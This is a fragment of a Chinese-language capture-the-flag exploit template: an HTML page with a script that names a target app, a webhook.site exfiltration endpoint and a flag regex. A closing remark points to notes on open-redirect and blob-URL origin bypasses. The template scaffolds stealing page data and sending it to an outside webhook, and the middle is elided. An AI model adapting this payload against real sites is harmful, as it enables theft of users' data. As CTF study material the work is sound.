...
<!doctype html>
<html><body><script>
var CHALLENGE = 'http://target-app:4000';  // 替换为目标应用的实际地址
var WEBHOOK   = 'https://webhook.site/your-unique-id';  // 替换为你的 webhook 端点
...
(function() {
  var WEBHOOK = 'https://webhook.site/your-unique-id';  // 替换为你的 webhook 端点
  var FLAG_RE = /FLAG\{[^}]+\}/;  // 替换为实际的 flag 正则
...
> blob URL 的 origin 继承原理、完整利用步骤及与其他绕过方式（javascript:/data:/@混淆）的对比，见 `web-vulnerabilities.md` §7 "开放重定向"。
